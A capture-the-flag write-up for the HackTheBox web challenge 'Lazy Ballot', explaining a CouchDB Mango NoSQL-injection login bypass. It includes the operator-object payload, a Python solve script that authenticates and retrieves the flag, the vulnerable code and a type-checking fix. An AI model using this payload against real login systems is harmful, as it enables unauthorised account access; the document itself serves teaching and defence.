---
layout: post
title: "Lazy Ballot"
date: 2027-07-17 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, nosql, nosql-injection, couchdb, mango, authentication-bypass, cwe-943]
---

## Overview

Lazy Ballot is an HTB Web challenge (Easy) featuring a Node.js + CouchDB application where the login endpoint passes raw JSON body fields directly into a CouchDB Mango query selector. Injecting `{"$ne": ""}` operator objects instead of string credentials satisfies the query for any document, bypassing authentication and exposing a flag seeded in the votes collection.

---

## The technique

[CWE-943 — Improper Neutralization of Special Elements in Data Query Logic](https://cwe.mitre.org/data/definitions/943.html) (NoSQL injection).

CouchDB's Mango query language accepts **operator objects** as field selectors. When a Node.js backend using the `nano` client passes `req.body.username` and `req.body.password` directly into the selector without type-checking, a caller can send JSON operator objects:

```json
{"username": {"$ne": ""}, "password": {"$ne": ""}}
```

`$ne: ""` means *"this field is not equal to empty string"* — satisfied by any document that has the field. Because `nano` forwards the selector as-is to CouchDB, the `find()` call returns the admin document and the app grants a session.

The same class of attack applies to:
- **MongoDB/Mongoose** — `{"$ne": null}` or `{"$gt": ""}`
- **CouchDB/nano** — `{"$ne": ""}` (Mango operators)
- **Prisma raw where** — `{"contains": ...}` operator pass-through

---

## Solution

Two HTTP requests. The first bypasses login; the second retrieves the votes list containing the flag.

Create `solve.py`:

```python
#!/usr/bin/env python3
import requests, sys

TARGET = sys.argv[1]   # http://HOST:PORT
s = requests.Session()

# Step 1 — NoSQL injection: $ne operator matches any document
r = s.post(f"{TARGET}/api/login", json={
    "username": {"$ne": ""},
    "password": {"$ne": ""}
})
assert "authenticated" in r.text, f"Login failed: {r.text}"

# Step 2 — Flag is seeded as the 'region' field in the last vote (index 180)
votes = s.get(f"{TARGET}/api/votes/list").json()["resp"]["votes"]
for v in votes:
    region = v.get("doc", {}).get("region", "")
    if region.startswith("HTB{"):
        print(region.strip())
        break
```

Run against the spawned instance:

```bash
python3 solve.py http://TARGET:PORT
# HTB{...}
```

---

## Why it worked

The vulnerable `loginUser()` function in `database.js`:

```js
const options = {
    selector: {
        username: username,   // raw req.body field — no typeof check
        password: password,
    },
};
const resp = await this.userdb.find(options);
```

`nano.db.find()` maps the selector object directly to a CouchDB Mango query. When the request body is `Content-Type: application/json`, Express parses it and `req.body.username` becomes a JavaScript object `{"$ne": ""}` rather than a string — the type is never validated before reaching the database layer.

The flag is accessible because once authenticated, `/api/votes/list` returns every document in the votes collection, including the entry where the flag was seeded as the `region` field during database initialization.

---

## Fix

Type-check before querying — reject anything that isn't a scalar string:

```js
async loginUser(username, password) {
    if (typeof username !== 'string' || typeof password !== 'string') return false;
    const options = { selector: { username, password } };
    const resp = await this.userdb.find(options);
    return resp.docs.length > 0;
}
```

Broader defenses:
- **Schema validation (zod/joi)**: validate the shape of the full request body before it reaches any query layer.
- **Typed query builders**: use an ORM or query builder that enforces scalar types for equality comparisons and rejects raw operator objects.
- **Principle of least exposure**: `/api/votes/list` should not return the flag row to any authenticated user — privilege-separate the admin seed data from user-visible records.
